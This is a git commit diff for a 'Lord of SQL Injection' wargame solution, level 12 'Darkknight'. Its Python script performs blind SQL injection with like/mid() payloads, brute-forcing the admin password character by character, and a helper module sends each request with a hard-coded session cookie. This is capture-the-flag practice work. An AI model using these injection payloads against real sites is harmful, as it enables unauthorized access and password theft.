2482da87c9f491328f5db6187727db43cc43f8cc
Moreal <dev.moreal@gmail.com>
2018-01-07 07:37:25 +0900

    LOS : 12 Darkknight

--- Wargame/Lord of SQL Injection/Code/12_Darkknight.py
+++ Wargame/Lord of SQL Injection/Code/12_Darkknight.py
@@ -2,12 +2,12 @@
 import urllib2, urllib, string
 from web import *
 
-url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw={}"
+url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?&no={}"
 
 # get length
-inject_url = "' || length(pw) like {}; -- -"
+inject_url = '0 or id like "admin" and length(pw) like {}'
 for i in range(1, 100):
-    req = getRequest(url,inject_url.format(i))
+    req = getRequest(url,inject_url.format(i), show=False)
     page = getPage(req)
     if "Hello admin" in page:
         length = i
@@ -17,10 +17,10 @@ print "Length :",length
 
 # get password : brute forcing
 password = ""
-inject_url = "' || mid(pw,{},1) like '{}"
+inject_url = '0 || id like "admin" and mid(pw,{},1) like "{}"'
 for i in range(1,length+1):
     for c in string.digits + string.letters:
-        req = getRequest(url, inject_url.format(i,c))
+        req = getRequest(url, inject_url.format(i,c),show=False)
         page = getPage(req)
         if "Hello admin" in page:
             print i,"'th letter is",c
--- Wargame/Lord of SQL Injection/Code/web.py
+++ Wargame/Lord of SQL Injection/Code/web.py
@@ -2,10 +2,22 @@
 
 import urllib2, urllib
 
-def getLength(url, success, arr=list(range(1,99))):
-    for i in arr:
-        new_url = url.format(i)
-        if success in urllib2.urlopen(urllib2.Request(new_url)).read(): return i
-    return -1
-    
-def bruteForce(url, success, 
+WEB_PHPSESSID = 'kvkemdvcf9bqkcmk5v2c51chk4'
+WEB_USER_AGENT = 'Mozilla/4.0'
+
+def getRequest(url, inject_url="", show=True):
+    if inject_url is not "": url = url.format(urllib.quote(inject_url))
+    if show: print url
+    req = urllib2.Request(url)
+    req.add_header('User-Agent', WEB_USER_AGENT)
+    req.add_header("Cookie","PHPSESSID=" + WEB_PHPSESSID)
+    return req
+
+def getPage(req):
+    return urllib2.urlopen(req).read()
+
+def setPHPSESSID(id):
+    WEB_PHPSESSID = id
+
+def setUSERAGENT(agent):
+    WEB_USER_AGENT = agent
